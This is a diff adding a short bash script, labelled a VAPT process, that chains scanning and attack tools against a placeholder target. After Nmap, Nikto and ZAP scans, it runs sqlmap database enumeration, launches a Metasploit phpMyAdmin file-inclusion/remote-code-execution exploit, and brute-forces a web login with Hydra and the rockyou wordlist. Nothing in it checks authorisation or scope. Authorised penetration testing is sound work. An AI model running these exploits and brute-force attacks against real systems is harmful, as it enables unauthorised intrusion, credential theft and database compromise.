@@ -1,0 +1,29 @@
+#!/bin/bash
+
+echo "Starting VAPT Process..."
+
+# Step 1: Information Gathering
+echo "Running Nmap scan..."
+nmap -A -T4 -p- <target_IP> > nmap_scan_results.txt
+
+# Step 2: Web Server Scanning
+echo "Running Nikto scan..."
+nikto -h <target_URL> > nikto_scan_results.txt
+
+# Step 3: Web Application Security Scan
+echo "Running OWASP ZAP Active Scan..."
+zap-cli quick-scan <target_URL>
+
+# Step 4: SQL Injection Testing
+echo "Running SQLmap..."
+sqlmap -u "<target_URL>?id=1" --dbs > sqlmap_results.txt
+
+# Step 5: Exploitation with Metasploit
+echo "Starting Metasploit..."
+msfconsole -q -x "use exploit/unix/webapp/phpmyadmin_lfi_rce; set RHOSTS <target_IP>; set TARGETURI /phpmyadmin/; exploit;"
+
+# Step 6: Brute Force Attack
+echo "Running Hydra brute force attack..."
+hydra -l admin -P rockyou.txt <target_IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" > hydra_results.txt
+
+echo "VAPT Process Completed. Check the results files."
